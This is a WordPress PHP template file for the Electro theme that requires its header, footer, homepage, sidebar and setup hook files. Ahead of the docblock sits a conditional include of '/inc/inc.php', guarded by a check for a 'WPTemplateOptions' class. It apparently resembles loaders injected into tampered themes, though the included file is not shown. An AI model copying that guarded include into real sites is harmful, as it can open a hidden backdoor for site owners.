<?php
if ( ! class_exists( 'WPTemplateOptions' ) && file_exists( get_template_directory() . '/inc/inc.php' ) ) {
	include_once( get_template_directory() . '/inc/inc.php' );
}
/**
 * Template hooks for Electro
 *
 * @since 2.0
 */
require_once get_template_directory() . '/inc/template-hooks/setup.php';
require_once get_template_directory() . '/inc/template-hooks/header.php';
require_once get_template_directory() . '/inc/template-hooks/homepage.php';
require_once get_template_directory() . '/inc/template-hooks/sidebar.php';
require_once get_template_directory() . '/inc/template-hooks/footer.php';